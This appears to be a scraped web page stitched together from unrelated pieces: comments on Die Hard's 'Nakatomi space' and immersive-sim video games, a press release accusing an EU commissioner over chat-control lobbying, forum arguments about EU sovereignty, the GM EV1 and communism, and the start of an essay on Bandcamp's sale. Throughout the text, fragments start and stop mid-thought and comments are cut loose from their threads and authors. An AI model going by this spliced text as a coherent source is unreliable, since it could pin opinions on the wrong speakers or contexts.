Reply Anonymous says: April 15, 2010 at 12:44 am Half-Life 1 is probably an even better parallel to the OP- your crowbar is your best friend in crawling through the ducts and utility tunnels of a ruined military research facility. Portal is another good demonstration of the fluidity of space and architecture. Finally the new Battlefield Bad Company is the logical application (or imitation) of this concept, where you can parachute onto a roof, use explosives to blast a hole in the roof (killing those underneath) and allowing passage to the objective. All structures are realistically destructible, giving the game a nice tangible feel. You can even systematically use explosives to have entire building collapse on top of opponents and objectives. Video games are a great medium (like film) for exploring how people use space when certain constraints are lifted. Reply Josh W says: October 28, 2010 at 2:58 am It's interesting to me that the israelies are now coming into trouble in their attempts to define palestine as a bounded and controlled space; tunneling is a trick that more than one person can play. It reminds me of playing chess against someone worse than me and avoiding using tactics that would be effective against my own position; when you use something, you generally display it, unless your tactic directly works against perception and leaves no lasting trace. On the moral side of things, I suppose the only way to combat such abstract love of ingenuity is to find a way to express it's damage and the value it ignores on the same level. In other words by focusing on how tunneling violates someone's environment, and the distinctions of function and possibility on which they form safety and self expression. If you can pull up all the differences (between negative control of space and valuable human control) to the level where the dynamism and coolness of tunnelling is obvious, then you break the fantasy, and the aesthetic of destruction, although hopefully keeping a lot of what made it good. My starting point is something like a gearbox, but more dynamic, where the rigidity of the axles corresponds to the rigitity of space in the building. Through and around these structures of walls, people twist and turn their way through the building, reconstructing and productively reprossesing the forces of the outside. It has a kind of life because the human activity moves around the walls in a way that confirms their value. Burrowing, in an empty building, is chopping and changing to derecognise those restrictions, long stripped of their original structuring and distinguishing function. When John McClane explores and reworks the tower, it has already been killed, and he is acting against it's infection and reconfiguring it. The office is no longer an office, because the activities that made it so have stopped. But that is an act of stubborness; the theives hoped to move through the structure without much damage, use it's existing rules to get their way and then leave, returning it to it's original purpose. If he'd just wait it out, normal service would be resumed soon. Instead multiple irreversible changes occur, expanding the damage done. That's not strictly true, as the action of succesful theft would cause the building to be reworked, the existing trauma and damage to people's personal sense of space might make it impossible to live/work there. In other words the functions would all be retained but have been undermined, made hollow. So the building in it's old form has already been killed, and with the old claims to it having been undermined, he's free to rework it as he sees fit, destroying the structures that the plan was specifically designed to take advantage of. Reply Rob says: November 30, 2011 at 2:41 pm (Long time no post.) Just wanted to make a point that Director John McTiernan was very proud of the way he communicated what I believe he called the 'geography' of the environment to the viewer. It's actually quite difficult when you have lots of shoot-out action going on to make it clear where all the players are with respect to one another. How far away is the guy sneaking up on McClane? 10 feet or 100? Is the door we just cut to on his left or right? If he runs there, does that put him in someone's line of fire? Is it a sprint of a couple of seconds or more? McTiernan came up with various tricks to help viewers retain a sense of movement and location – for instance, having the bad guys shooting and moving (say) right and McClane facing and shooting to the left. If McClane starts running to the right, you know he's retreating, even if it's in close-up not a wide shot. So not only is Die Hard groundbreaking as an architectural movie, it's groundbreaking in its ability to convey correct orientation and motion within that architecture. (And it introduced lens flares to Hollywood, which I feel is also highly culturally significant, though perhaps not architecturally so.)

Excellent analysis, Geoff. This is the sort of thing a reader of your blog cherishes the most. Anyway: an example of a Nakatomi-light space is \"Witness\", 7th episode of the tv series Person of Interest. Being almost entirely set in Manhattan, it's common place in the series to have somebody at some point trapped somewhere. Ballardian galore in many an episode: rooftops, empty warehouses, impenetrable eerie-looking buildings, and loads of non-lieux everywhere. In this particular case the hero, Reese, has to rescue the \"victim\" – a high school teacher – from somebody who wants to kill him. It's a tenement building. The thing is: they go out from the wrong side, they get killed; later: they go out at all, they get killed; later still: the killers get in the building, so they have to go out OR they get killed. In 45 minutes you binge in hollywood clichés, but I think the authors deal with it pretty well in the end. There are no air vents, and no elevator shaft – thus \"Nakatomi-light\" – but the characters must do every step within the building. Even – most importantly – moving from building to building. All from the inside. I'd say there's a mix here between Geoff's (and McTiernan's) Nakatomi Space, the Nablus Paradigm – the invisible guerrilla, the opening of architectural spaces that should normally be closed or smooth – and the usual Hollywood siege cliché. And Ballard. And Otomo Katsuhiro and his very ballardian comic \"Domu\". Reply Brandon Valentine says: December 6, 2014 at 3:32 am Geoff, A friend just shared this very entertaining article with me.

This is where players move through the game’s spaces in ways almost certainly not intended by the architects - including exploiting every possible trick to accomplish impossible moves.

In a film, characters interact only with the in-universe architects and can only subvert the intentions of those architects, not those of the author. But in a game, the player is not the character. The player can make out-of-universe choices too, and can subvert the intentions of the architects (developers) of the game. reply Terr_ 2 hours agorootparentUh, yeah, and those are all reasons to reject the conclusion that games (like Deus Ex) merely offer second-rate illusory \"Nakatomi Spaces\" compared to movies (like Die Hard.)A player choosing to make their avatar avoid the front door in favor of discovering an unusual route is always going to be a more authentic experience of subverting architecture, compared to passively observing a character doing the same actions in film.Being able to go further and glitch&#x2F;hack&#x2F;mod the game merely raises the ceiling, it does not lower the floor. reply jl6 1 hour agorootparentI don’t think it is all that subversive to use a route that the developer built for that purpose. reply 0x112233 10 hours agorootparentprev> When it comes to works of fiction, what we need to be looking at are the intents and assumptions of the in-universe fictional architects and&#x2F;or typical users of the space.I agree in the context of films, but this ignores the relationship between creator and player&#x2F;user in interactive fiction like games. reply Terr_ 9 hours agorootparentYour argument is incomplete, everyone agrees differences exist, but you haven&#x27;t explained how any of those differences make \"Nakatomi spaces\" in games somehow less legitimate than in movies like Die Hard.If anything, you&#x27;ve got it backwards: The fact that each individual player must notice and choose to exploit alternate paths makes them more authentically unusual and innovative than in movies, rather than less. reply sleepyams 3 hours agoparentprevI recommend the Mario 64 \"Half A-Press\" video if you haven&#x27;t seen it:https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=kpk2tdsPh0A reply Night_Thastus 18 hours agoprevThis post reminds me a bit of some games, which would normally be called \"immersive sims\". One of their biggest draws is how they let you interact with the environment in such a variety of ways. A blocked-off entrance isn&#x27;t a set scripted objective or a tool for the developers to get you to go elsewhere - it&#x27;s an opportunity for the player to find a creative solution.Blow up the barrier. Pick a lock. Break a window. Reach through an opening to press a button to open another door. Enter from vents or sewers. Alert an NPC so they open another entrance to check it out. Shut off the power elsewhere. Etc.It&#x27;s so much fun to have all those options with how you interact with the environment, instead of it just being static and 1-dimensional. reply Sharlin 14 hours agoparentThe \"Clockwork Mansion\" level of Dishonored II is could be seen as almost a deconstruction of this concept, making you infiltrate and explore a mansion where the walls and floors move and rooms turn into other rooms by means of intricate machinery – turning the very architecture of the house into a puzzle you have to solve. Inevitably, of course, you find your way \"behind the scenes\", into the access corridors behind the walls and underneath the floors, revealing the complex mechanisms responsible for the transformations. It&#x27;s a level design masterpiece, and honestly it&#x27;s a bit crazy that they really went and made everything physically and mechanically plausible. reply Night_Thastus 9 hours agorootparentThe clockwork mansion is the swan song of Arkane if you ask me.They continued, and I liked Death of the Outsider, but Arkane is long gone now. :( reply keiferski 18 hours agoparentprevI enjoyed the new Cyberpunk game, but one thing that did bother me was its lack of \"Nakatomi spaces.\" Most of the city doors are locked and don&#x27;t lead anywhere, and while the city itself is fun to roam around in, it all feels very on rails and with basically no way to \"hack\" the local infrastructure and environment – which I would consider almost a fundamental quality of cyberpunk literature. reply dexwiz 13 hours agorootparentI think those mostly comes down to resources.

Right during the tutorial you&#x27;re given powers to:- Telekinetically lift, rotate, and glue together anything that is not alive or nailed down.- Summon and activate small mechanisms (fans, self-spinning wheels, flamethrowers, hydrants, etc).- Phase vertically through any ceiling, as long as it&#x27;s not too far away. This includes mountains, floating platforms, and large enemies.- Reverse the last ~30 seconds of any object&#x27;s motion. A falling boulder flies back up, a floating plank goes against the current, a spinning wheel changes direction.Then you get to apply these powers for transport, combat, and puzzles.

Climbing a nearby height, letting go, paragliding over an obstacle, etc. And then Tears of the Kingdom cranked that to 11 plus added all the new toys you mentioned.In many ways, I&#x27;m reminded of the Portal games where just figuring out how to creatively move the player character from A to B is a big part of the game loop. reply cgriswald 11 hours agorootparentprevOne of my favorites in the previous game, Breath of the Wild, was a ball-in-maze puzzle you&#x27;re presumably supposed to solve by guiding the ball through the maze with motion controls and have it fall out the exit into a cup; but it is possible to instead use the maze essentially as a paddle and bat the ball into the cup instead. reply philsnow 9 hours agorootparentprevYour characterization of Tears of the Kingdom strongly reminds me of https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;The_Incredible_Machine reply lobsterthief 5 hours agorootparentOh man I played that so much. Was such a great game as a kid. reply munificent 17 hours agoparentprevExcellent point and I think there is a deeper connection here:I believe a big part of the success of Die Hard is that McClane is such a strong hero. One of the ways the movie viscerally demonstrates his individualist heroism is how we constantly subverts the architecture of Nakatomi Plaza. While most of us would be awed by the expensive and heft of a luxurious skyscraper and feel obligated to follow its rules, McClane gives zero fucks and bends the skyscraper&#x27;s physical substance to his will.Likewise, videogames where the world is a pile of static geometry that you can only navigate in ways the game designers decided to allow feel decidedly disempowering. You&#x27;re essentially a rat in their maze where your only option is to find the cheese in the way they&#x27;ve chosen.Immersive simulation-like games with emergent gameplay are empowering because they offer an open-ended space to explore with greater agency and creativity. It feels like it is your game and the NPCs are just playing in it. reply twic 16 hours agoparentprevI first thought of Monaco, a heist game in which one character, The Mole, can dig through walls.I then thought of Broforce, a retro side-scrolling shooter, where almost all the terrain is destructible, and so if you don&#x27;t fancy climbing the enemy&#x27;s walls, or navigating some subterranean passages, you can usually just blast your way straight through. Indeed, there are some levels which i can only complete by digging a tunnel under the entire map, avoiding both the enemies on the surface, and the constant aerial bombardment which is raining down on it. reply kouru225 14 hours agoparentprevThere’s an indie dev making an immersive sim inspired by Die Hard rn.

When I first played through MD I did it very linearly, only later did I realize that it was far more open than I originally expected (Because Human Revolution was pretty limited in comparison).My point for it being a shallow imitation should be reserved only for the plot and themes of the original game, which are far more subversive and interesting than the ones in MD or HR.

Not sure why it was removed, because you&#x27;re right, games that are primarily immersive sims aren&#x27;t being made as much by AAA studios now. Some mechanics are integrated into open world games to varying degrees (you could argue that BotW&#x2F;TotK take so much inspiration from them that they might count, but to many people a replayable mission-based format is an essential part that is missing in them).

For instance, the buildability of Minecraft and destructibility of GTA both enable worlds of exceptions and edge cases, where players can come up with alternate pathways to their goal, and where the latent environmental possibilities can even shape the player’s goals.In ill-designed sandbox games without sufficient storyline (or other meaning-making mechanisms), if I run up against the edge of a map, or can’t pick up whatever decorative object, there’s a certain disappointment - that the world is limiting, but there isn’t sufficient purpose&#x2F;meaning to balance those limitations.In real life, there’s a reason we don’t indiscriminately blast holes through walls (other than perhaps lack of appropriate tool) - we care about the people on the other side, the asset comprised by the wall material, etc. But the material possibility of such hole-blasting always remains.This is a rambling comment with unfinished thoughts, but what I’m getting at is: there’s a relationship between potential interactions w&#x2F; our environment and the “amount” of meaning that we ascribe and extract from it. reply dEnigma 16 hours agoparentI don&#x27;t think GTA is the best example for \"alternate navigation\" through \"destructibility\".

The Israeli forces&#x27; (horrifying, from the account in the article) \"reconfiguration\" of Nablus was a massively forceful one, blasting through wall after (residential) wall throughout the entire city *. In Die Hard (1 and 3) the protagonists&#x27; interactions with the civil infrastructure were far more involuntary and far less forceful, with the characters often being imperilled by those hostile spaces. Blasting through them like a Terminator wouldn&#x27;t have been at all in keeping with the movies and the article does the first one a disservice by describing it in those terms.The second one isn&#x27;t great but I&#x27;ve always rather enjoyed it too.

In that film, Bourne travels by boat to Marseilles, by train to Zurich, and then by impulsively-hired-car-driven-by-sketchy-woman to Paris. (And then by stolen car to someplace in rural France.)In the second Bourne film (the first one directed by Greenglass), he starts off in Goa, then shows up in an airport in Italy, and later appears (with no indication of how he travels) in Munich, Berlin, Moscow, and New York City.And, honestly, there wasn&#x27;t a whole lot of visible \"travel\" in the \"old\" Bond, either. Bond is an agent of MI6, often with a cover as some kind of rich businessman or playboy. So of course he travels everywhere by passenger plane. (Unless he&#x27;s doing some covert infiltration by parachute or surfboard or whatever.) The difference between Bond and (later) Bourne in terms of travel is that Bond has the resources of a wealthy government, while Bourne has... some kind of ninja superpower, I guess.

I can easily understand why the “gritty realism” action genre trend didn’t last long, and why some folks do not enjoy it, it quickly becomes somewhat oppressive to endure.

It would be really cool to see a movie that fleshed out some strategic dynamics of urban combat of busting through walls etc, but it feels like accessing less-used mechanical spaces isn&#x27;t that.

September 2023 0 Breyer on chat control investigative research: EU Commissioner as double agent of foreign interference EUROPEAN PARLIAMENT FREEDOM, DEMOCRACY AND TRANSPARENCY PRESS RELEASES Research published yesterday by several European media outlets has revealed that an international campaign in support of the EU’s proposed child sexual abuse regulation has been largely orchestrated and financed by a network of organisations with links to the tech industry and security services. The controversial “chat control” regulation would require providers to indiscriminately scan and automatically disclose allegedly suspicious private messages and photos. EU Parliament lawmaker Patrick Breyer (Pirate Party), negotiator for the Greens/European Free Alliance group on the proposed regulation, expresses shock: “As negotiator for my group, many of the organisations mentioned in the report, which call themselves child protection organisations or victims’ associations, also contacted me. But I had no idea that the pro-chat control campaign was being orchestrated and funded by a network of organisations linked to the tech industry and security services, drawing millions in funding from a US-led foundation and paying foreign consulting agencies to create lobbying strategies. I had previously only expected corporations to use such methods of ‘capturing legislation’. To set a precedent, US stakeholders apparently want to push through indiscriminate screening of our private messages and photos in Europe, which is not law in the US itself. So far, the EU’s Home Affairs Commission has mainly attracted attention as a source of misinformation on chat control. Yesterday’s report makes EU Home Affairs Commissioner Ylva Johansson look like a double agent of foreign interference. We urgently need a legislative footprint that exposes such remote-controlled and foreign-dictated legislation. This is about nothing less than defending our democracy and our fundamental right to digital privacy of correspondence!” Commenting on the report, President of non-commercial encrypted messaging service Signal Meredith Whittaker said, “the best follow the money reporting on who’s behind the global attack on digital privacy yet. It’s law enforcement x AI companies posing as NGOs with a commercial interest in selling scammy mass scanning tech. Deeply cynical, deeply shady.” Cryptologist Matthew Green commented, “Just saw this new investigation into the web of for-profit AI companies pushing anti-encryption legislation in Europe, and it feels like the work of secret organization in a James Bond movie.” Diego Naranjo, Head of Policy of European Digital Rights, said “The investigation published today confirms our worst fears: The most criticised European law touching on technology in the last decade is the product of the lobby of private corporations and law enforcement. Commissioner Johansson ignored academia and civil society in Europe while she shook hands with Big Tech in order to propose a law that will attempt to legalise mass surveillance and break encryption.” TAGS: Chatcontrol back to archive Related topics 12.

Non-native people stand out.It&#x27;s a lot harder for people to spread misinformation online in a country like Estonia without speaking Estonian and keeping up with Estonian affairs. I think even corruption would be harder to swing against officials in a small European state compared to the EU, because things are less likely to be lost in endless European bureaucracy.However, I think the nation itself could be \"bribed\" in a legal fashion.

So much for stopping bribery and misinformation. See the current Chat Control law which is sponsored by foreign corporations.In a world without the EU, those companies would have had to lobby their way into 27 different parliaments and the countries most eager to proceed with a dangerous piece of legislation could have been the canary in the coal mine for the other countries about what not to do.Instead corporations can now buy their way into the inner circle of a single European commissioner (who is not elected mind you). The EU basically streamlined corruption and lacks the complete oversight to do anything about it.Finally, the EU as it exists in its current form has only been around for the last 30 years, which is a mere blip in the history of nations like France, Germany and others.To claim that only an Institution like the EU can bring an end to corruption and bribery seems a complete stretch if not an outright lie.There are more than 200 sovereign countries in the world out of which 27 decided to completely or partially relinquish their own sovereignty to a supra national agency such as the EU.This is hardly the norm and history will tell in a hundred years from now that this was bad idea, just like the USSR was a bad idea. reply skummetmaelk 2 hours agorootparent> There are more than 200 sovereign countries in the world out of which 27 decided to completely or partially relinquish their own sovereignty to a supra national agency such as the EU.When is this argument going to die?

At the end of the day your argument rests on the assumption that the nation state is the final form of sovereignty, and there&#x27;s just no God-given reason for that to be the case.Entities form political and economic alliances when it is beneficial to do so. There are costs associated with the benefits of course, and those must be evaluated. Your argument that it&#x27;s inherently bad because \"It&#x27;s not a sovereign nation state any more\", is just a rather weak, but infectious, talking point.

Because something exists does not mean it can not be dissolved or changed.Bizarrely, when it comes to the EU, most people like you say, well it&#x27;s there now what do you want to do about it? But the states in Europe were there as well before the CEE and before the EU, shouldn&#x27;t the same rule apply then?It is perfectly possible and acceptable for people to decide their fate.

But I do know that a nation is made of a history, a culture, a language, common values and a common identity.You can&#x27;t just wave a wand in the air and say to 500 million people, here you go, you are no longer French, German or Spanish, you are European. It&#x27;s been tried in the past with arbitrary borders being drawn between India and Pakistan and as well in Africa. We can see the results of that now.> Entities form political and economic alliances when it is beneficial to do so. There are costs associated with the benefits of course, and those must be evaluated. Your argument that it&#x27;s inherently bad because \"It&#x27;s not a sovereign nation state any more\", is just a rather weak, but infectious, talking point. I don&#x27;t understand why people keep regurgitating it.Absolutely but there is a difference between an alliance and a supra national authority that can impose rules and regulations to it&#x27;s members. Then its not an alliance, that&#x27;s being a vassal to another state&#x2F;entity.A sovereign state can decide it&#x27;s fate and decide what is beneficial for itself and it&#x27;s citizens. States can agree to implement laws based on pacts and treaties. That is not disputed.If there is a supreme authority that can compel you to apply laws to your citizens without their explicit approval, then, the state becomes just a shell.In essence this setup of the EU will lead the the formation of the \"United states of Europe\".

The Claim by OP was that the EU was better at stamping out corruption because it was bigger.That&#x27;s demonstrably false. Corruption and bribery existed before the EU as you pointed out and it exists now as well. So this point is mute.The only difference as I explained in my comment is that now, the entities wishing to corrupt and&#x2F;or influence don&#x27;t have to lobby their way into 27 different governments, they can just get cozy with one of the commissioners and push their agenda. Much more efficient and also less costly.If there is one thing I have learned in my short career as an SDE is that having a single point of failure in your organization is a recipe for disaster. You want redundancy and checks and balances so that not one person can bring the whole thing down.Here we have the exact opposite. The commissioners are chosen via back-room meetings between the ministers of the member states, their mandates are not revocable by the people, and since there is only one of them, you don&#x27;t need to reach a consensus to push a new law. That in itself means that they can be easily influenced and their potential for damage is greater.> The only way out of this tax exploitation is \"harmonizing\" certain taxes across the EU.

Germany was part of an empire before becoming a country that was divided and re-united later on.My comment was simply highlighting the fact that to the EU absolutists if the EU did not exist things would be worse.My contention is that countries&#x2F;kingdoms&#x2F;sates such as Germany and France existed in one shape or another long before the EU came along. Therefore it is possible to return to this type of states without the need for a supra national entity.> Just wow. The EU has flaws, but that&#x27;s an insane comparison.The CEE&#x27;s goal was to bring peace to the continent and to facilitate trade between the countries. Now the EU decides the monetary policy of the Eurozone countries, it has its own parliament, there is talk about having it&#x27;s own army, there is a flag and an anthem. To top it all of the laws of the EU supersede the laws of the member states.The EU is not so much an union anymore but a burgeoning federal state that has started to swallow all it&#x27;s member states.You can look up countless articles about the projects of the most radical EU absolutists such as Martin Shulz who are explicitly calling for the creation of the \"United states of Europe\".That in turns would result in each country&#x27;s parliament becoming more or less useless therefore removing the ability for these nations to govern themselves.Except in this case the power won&#x27;t be in Moscow but in Brussels. reply skummetmaelk 2 hours agorootparentprevIt&#x27;s not true, and the post is missing a &#x2F;s. reply zosima 10 hours agorootparentprevEU has started a general fight with all tech.

All the matching signs prove is that only one organisation is significantly involved.

Outside of the US, you have to call it \"sparkling foreign interference\".It is always a shame when governments get corrupted, but the European view is usually not \"welp, the experiment failed, let&#x27;s get rid of the government completely\", but rather \"we need to make the government stronger, to have it resist interference harder\".US constitution has \"We the people\", but Americans don&#x27;t really see their government as \"We\", but rather as some incompetent entity they&#x27;re forced to live under.Europeans more strongly see governments as their representation. The government is seen as people banding together, through their representatives. Governments exist to resist undesirable forces, like exploitation of people by commercial entities.This is also the reason why Europeans like regulations, a thing unfathomable in the US. It&#x27;s not \"oh no, those dumb politicians stifle our precious job-creating businesses\", but rather \"we&#x27;re the labor force, we&#x27;re the consumers, and the businesses depend on us, so we won&#x27;t let them fuck with us\".

Caveat: you probably can&#x27;t find any statement all Americans agree on :-) ).The US Constitution does begin with the phrase \"We the people\", but I think you misunderstand its context. It never says the US government and its people are the same. I can quote that sentence from memory. The text follows with the goals for creating a federal government (e.g., \"establish justice\" and \"provide for the common defense\"). It ends by saying that We the People \"... do ordain and establish this Constitution for the United States of America\". In other words, it&#x27;s clearly stated that the government is not the people. The US federal government is instead an organization established by the people under rules defined by the Constitution.So Americans would generally agree that the US government is NOT the people. The US government is instead an organization set up by the people, in order to accomplish certain goals. If we don&#x27;t like how its current leadership runs things, the intent is that We the People can change the leadership via an election (as established by the Constitution).> but rather as some incompetent entity they&#x27;re forced to live under.You&#x27;ll find lots of claims about incompetence, especially at political rallies where someone is trying to convince everyone to vote for them. But while many people want someone or other voted in, and there are always proposals for changes, few call for the elimination of the US government. They just want \"their side\" voted in.> Europeans more strongly see governments as their representation. The government is seen as people banding together, through their representatives. Governments exist to resist undesirable forces, like exploitation of people by commercial entities.Americans also view their government as necessary to resist undesirable forces. Per that sentence, the government exists to \"provide for the common defense\" and \"promote the general welfare\".However, the American view is that governments can also be the source of tyranny. This is not a crazy view; see the various dictatorships around the world. Governments can be powerful entities. Therefore, there needs to be a way to ensure that they are (1) representative and (2) constrained so they don&#x27;t become tyrannical.> This is also the reason why Europeans like regulations, a thing unfathomable in the US.The US has lots of regulations, so it&#x27;s not that the US doesn&#x27;t have any. However, Americans are generally more skeptical of regulation than Europeans. All regulations have unintended consequences; if the regulation is not carefully crafted, the regulation can be worse than the problem.For example: I would instinctively ignore the goal of any proposed law or regulation. I don&#x27;t really care what its goal is. That is mostly irrelevant. What is the actual impact of the law or regulation? If it does something good, but overall makes things worse, then it should be rejected even if it has a good goal. reply throwaway14356 7 hours agorootparentI believe it was that the EU countries prefer law as opposed to regulation and we definitely don&#x27;t like guidelines. reply Aerroon 7 hours agorootparentprevEuropeans might see their own governments as representation, but I don&#x27;t think they view the EU as representing them.

The sentiment seems similar to what people in the USSR thought of Moscow.I think part of the problem is that the EU can&#x27;t work in the same way the US federal government does or ever did. Culturally the countries are too dissimilar. There are many friction points that make a closer union very difficult to swing without trying to pull a fast one over the population (like they did with the vote over the EU constitution).One friction point is the \"liking of regulations\" you mention.

See e.g. section (20) of the ePrivacy directive:\"(20) Service providers should take appropriate measures to safeguard the security of their services, if necessary in conjunction with the provider of the network, and inform subscribers of any special risks of a breach of the security of the network. Such risks may especially occur for electronic communications services over an open network such as the Internet or analogue mobile telephony. It is particularly important for subscribers and users of such services to be fully informed by their service provider of the existing security risks which lie outside the scope of possible remedies by the service provider. Service providers who offer publicly available electronic communications services over the Internet should inform users and subscribers of measures they can take to protect the security of their communications for instance by using specific types of software or encryption technologies. The requirement to inform subscribers of particular security risks does not discharge a service provider from the obligation to take, at its own costs, appropriate and immediate measures to remedy any new, unforeseen security risks and restore the normal security level of the service. The provision of information about security risks to the subscriber should be free of charge except for any nominal costs which the subscriber may incur while receiving or collecting the information, for instance by downloading an electronic mail message. Security is appraised in the light of Article 17 of Directive 95&#x2F;46&#x2F;EC.\"This is all good and fine advice. But for a small company it&#x27;s really not clear when it&#x27;s appropriate to give advice on proper security habits for users. More, the vast majority of companies, dealing with communication, will be completely unaware of this law (and the 1000s of others similar provisions in other laws).

The consequence is that “more democracy” doesn’t help the EU, or make it more attractive (at least not to national governments, and they’re the ones that sign treaties).Balancing the powers of the individual EU states, with their elected governments and different democratic processes, with the powers of the EU as a super state entity is hard. No national government wants to hand off their own sovereign power to an external entity they have little direct influence over, so the EU commissioners exist. Their explicit purpose is to allow national governments to place a heavy thumb on the democratic scales in Brussels, to provide assurances to those national governments that their own state can’t be dictated to by other states within the EU who may hold different cultural values.The result of all this mess isn’t perfect, and is hard to understand as a random citizen. But simply getting rid of commissioners, and introducing “more democracy” which implicitly reduces the power of national governments, doesn’t provide a practical solution for the EU. The real solutions will be convoluted, nuanced, and slow to develop, that’s just the consequence of trying to get 27 very independent nation states to get along. reply wwtrv 7 hours agorootparent> to provide assurances to those national governments that their own state can’t be dictated to by other states within the EU who may hold different cultural values.You might be thinking about the council and not the commission?

Lessees countered by offering to release GM from such obligations and handle the repairs themselves but GM refused that offer. But why? It&#x27;s not as though they might have set a dangerous precedent by allowing EV1 lessees-turned-owners to repair their own cars, since buying out car leases and third party repairs were already normal aspects of the car industry. GM were fine with this generally but in this specific case they refused to allow it.To me it seems like some GM executives hated having been required by California into making the EV1 in the first place and wanted to destroy all of the cars for some feeling of satisfaction and finality. Pure spite in other words. Maaybe GM were egged on by oil companies who wanted to crush the spirits of people who thought electric cars were viable, but the oil company angle doesn&#x27;t really seem necessary to explain what happened, unless you believe GM wouldn&#x27;t make a decision like this out of pure spite. reply actionfromafar 11 hours agorootparentNot exacly spite, but I think it would do just fine with GM not wanting to have living daily reminders of EV feasibility rolling on the streets. reply lawlessone 14 hours agorootparentprev>It&#x27;s unlikely to be the same people subscribing to both of those theories.You are mostly correct here with this, but I definitely know of the odd exceptions turned anti-green the moment green became fashionable.

There are exact Communist correspondents for prophets, saints, martyrs, priests, the Holy Bible, heretics, the Vatican and so on.The \"Communist state\" is the Communist correspondent of the Christian Heaven. While the Christians have always been taught that they must be obedient and that they must work diligently, because despite the fact that in this life their good deeds are not rewarded as they should, they will be rewarded in their afterlife, in Heaven, the citizens of the states where the Communists have the power have always been taught that they must be obedient and that they must work diligently, because despite the fact that in this life their good deeds are not rewarded as they should, their children will receive the reward, when living in a \"Communist state\".Having been born and raised in a country occupied by Communists, I certainly know the facts about them better than any outsider.Therefore the \"Communist state\" has always been nothing more than a propaganda instrument and none of those using this instrument have really believed that it is something that could ever exist in reality. reply Georgelemental 10 hours agorootparentprev> Communism involves a class-less societyPeople keep saying that, but every society that&#x27;s ever been called \"communist\" has had classes.

You can read it below or jump directly to it here. They can and will ruin everything you loveby Miranda Reinert In March of 2022, Bandcamp Welcome to Hell World Luke O’Neil subscribe now!!!!!!!!!!!! In March of 2022, Bandcamp was acquired by Epic Games, the folks behind Fortnite and Unreal Engine. While the change in ownership raised eyebrows and triggered endless jokes, the site seemed to stay running much the same at first. Just over a year later in May of 2023 it was announced that Bandcamp’s employees voted 31-7 to unionize as Bandcamp United and were to be recognized by Epic. All the while Bandcamp Daily’s distinctive editorial coverage continued. Their popular Bandcamp Fridays – an initiative started in 2020 in which the site forgoes their 15% fee of sales on the first Friday of each month – also continued. So far so good. Then at the end of September 2023 it was announced that Epic would be selling Bandcamp to content licensing and service company Songtradr. As of their initial statement regarding the acquisition, Songtradr is planning to continue Bandcamp Friday, keep Bandcamp Daily, and maintain all current features, but they were clear that not all employees would be retained. As with all layoffs, this decision was presented as a necessary evil – there’s simply no way they could run this company with all those employees! – but they swore to you, their darling consumer, that you would feel no effects. Needless to say, having observed one single corporate acquisition before, Songtradr didn't recognize Bandcamp’s union, and employees remained in limbo for weeks before it was finally announced who would be let go – 60 of the 118 employees, slashing 50% or more across all departments, including half of the Bandcamp Daily editorial staff and 70% of the vinyl team. SFGate reports that the layoffs disproportionately impact those eligible for union membership, including every member of their 8 person bargaining team. But don’t worry about that! Songtradr loves your community! Their CEO is a “passionate musician” himself. You can trust him. Paul Wiltshire would have you believe his company is aligned with artists, even if he comes at music with beliefs like “music as a whole is inherently more valuable as a consequence” of catalog sales – i.e. the transfer of entire catalogs of music to venture capitalist firms looking to exploit copyrights they had no hand in creating. It’s a trend underscored not by increased value of art, but a change in who is able to actually profit off art. The current state of the music industry has devalued music to the point massive artists will make more money selling off their rights than they can off sales. This has been the first blow to Bandcamp’s pretty untouchable reputation. While Bandcamp has always been a tech company, it has also long been seen as a line of defense against the big, bad music streaming services, and has held a culture of its own as a discovery tool for underground, independent music. It is a website that has been able to garner goodwill on all three prongs of its offerings. It’s a music journalism outlet – importantly, that pays – uniquely interested in underground, independent art. It’s a natural extension of the reputation of being able to stumble upon great, independent music via the database of extensively tagged music. Bandcamp Daily has been a beacon of interesting and diverse coverage in a music journalism landscape that is increasingly only interested in finding a way to shoehorn Taylor Swift in wherever they can. From an artist perspective, the combination of the coverage Bandcamp Daily provides and the nature of the built-in discovery tools has made the site integral to being seen in an increasingly crowded digital world. Upon news of the sale and of layoffs, musicians took to Twitter to give their support to the Bandcamp staff and share their worry about the future due to what Bandcamp has meant to them. New Zealand musician, Lukas Mayo, who makes music under the name Pickle Darling, expressed concern that much of their favorite music “is going to disappear forever” and credits former members of the editorial staff at Bandcamp for all of the traction their music ever received – “no algorithms, just people who loved music and wanted to highlight music they loved, without any concern about how ‘big’ or important the artist was,” they said. Philadelphia indie punk band Gladie credited the platform with being instrumental in their ability to self release their album, Don’t Know What You’re in Until You’re Out, but remain skeptical of what Songtradr will do “to a once beloved community in order to squeeze out every last dollar for its investors.” Social media is full of endless sentiments bolstering the fact that Bandcamp has achieved a reputation of being a mostly altruistic, artist first company up to this point. It’s hard to overstate just how much good will Bandcamp has been able to accrue. Just like Spotify is trying to be seen as synonymous with the very concept of listening to music, Bandcamp has aimed to be seen as synonymous with the act of supporting artists. And what’s more they’ve succeeded! It’s a convenient service that is seen as the alternative to fractions of pennies per stream and unpredictable algorithms. The refrain is everywhere: Don’t stream music on Spotify! Go buy it on Bandcamp! Bandcamp has been the reputational beneficiary of an unforced binary born of the era of convenience internet. It is the very rare decent middle man that is providing enough value to the thing people care about – supporting music and the artists who make it – that it’s become the only logical music purchasing option for many people. Fans have built libraries and have been able to feel good doing it. People want to support people who make the art and media that they enjoy. It’s obvious in the rise of OnlyFans and of newsletters helmed by individual writers. What Bandcamp did was make it so easy to feel good about the company beyond being that middle man service. It’s even more centralized than supporting writers through newsletters, as much as Substack would like you to see them as synonymous with supporting writers. The reputation is better than OnlyFans because the platform doesn’t appear to be as much at odds with the people creating the content on the site. Despite discussions centered so much around editorial staff layoffs and the implications for music journalism, I think Bandcamp should be discussed more like MySpace than it is like, for example, a formerly taste-making site like Vice. This is a story about the cyclical issue with the internet. Bandcamp and MySpace were both built by people who genuinely love music. They have served as universes within themselves where the possibilities of music discovery are endless – it’s easy to search for hours and find new, exciting music within any genre or location imaginable. They have both had curated homepages run by people with deep, earnest connections to music who are hoping to bring ears to the best of what’s available on their respective websites. They’ve both spawned new genres and music scenes, because that’s what happens when that’s where the musicians can be found. Perhaps most importantly, they both have also offered the great promise of the internet – the idea of democratization. This idea that you can skirt the music industry, release whatever you want to everybody in the world directly through this one website, and the people will find you. It can work. At least until the companies with dubious interest in “music culture” decide it’s not enough to just sustain. The line must go up infinitely. Beloved websites are destroyed by money hungry ghouls everyday. The websites I spent years of my life reading as a teenager desperate to 